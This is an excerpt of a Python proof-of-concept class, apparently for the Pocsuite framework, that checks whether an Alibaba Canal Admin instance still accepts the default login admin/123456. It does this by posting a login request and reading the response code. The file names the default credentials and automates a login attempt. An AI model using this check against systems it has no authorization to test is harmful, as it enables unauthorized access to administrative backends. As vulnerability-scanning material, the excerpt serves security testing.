...
class CanalAdminPOC(POCBase):
    ...
    references = ["https://github.com/alibaba/canal.git"]  # 漏洞地址来源,0day不用写
    name = "Canal_Admin弱口令 PoC"  # PoC 名称
    appPowerLink = "https://github.com/alibaba/canal.git"  # 漏洞厂商主页地址
    appName = "Canal_Admin"  # 漏洞应用名称
    ...
    desc = """
            Canal_Admin存在弱口令，使用admin/123456，可以登录到后台进行恶意操作
        """  # 漏洞简要描述
    ...
    def _check(self):
        ...
        try:
            ...
            response = requests.post(url=url, headers=headers, json=json, allow_redirects=False, verify=False,
                                     timeout=5)
            dit = response.json()
            if dit.get("message") == None and dit.get("code") == 20000:
                result.append(url)
